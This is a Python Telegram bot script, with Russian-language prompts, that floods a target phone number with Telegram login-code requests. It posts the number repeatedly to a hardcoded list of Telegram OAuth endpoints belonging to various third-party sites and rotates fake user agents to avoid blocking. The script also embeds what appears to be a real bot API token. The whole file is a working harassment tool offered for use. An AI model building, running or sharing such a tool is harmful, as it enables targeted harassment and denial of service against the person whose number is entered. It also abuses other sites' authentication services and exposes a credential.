import telebot
import requests
from fake_useragent import UserAgent
import time
import threading

bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")

endpoints = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
    'https://my.telegram.org/auth/send_password'
]

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Отправь /spam +79998887766 5 (номер и кол-во циклов)")

@bot.message_handler(commands=['spam'])
def spam(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Формат: /spam +79998887766 5")
        return
    phone = parts[1]
    try:
        cycles = int(parts[2])
    except:
        bot.reply_to(message, "Кол-во циклов должно быть числом")
        return
    if cycles <= 0:
        bot.reply_to(message, "Циклов должно быть > 0")
        return
    bot.reply_to(message, f"Начинаю спам для {phone}, {cycles} циклов")
    def worker():
        ua = UserAgent()
        total = 0
        for cycle in range(1, cycles + 1):
            headers = {'user-agent': ua.random}
            data = {'phone': phone}
            for endpoint in endpoints:
                try:
                    r = requests.post(endpoint, headers=headers, data=data, timeout=10)
                    if r.status_code == 200:
                        total += 1
                except:
                    pass
            time.sleep(5)
        bot.send_message(message.chat.id, f"Готово! Всего запросов: {total}")
    threading.Thread(target=worker).start()

if __name__ == '__main__':
    bot.infinity_polling()
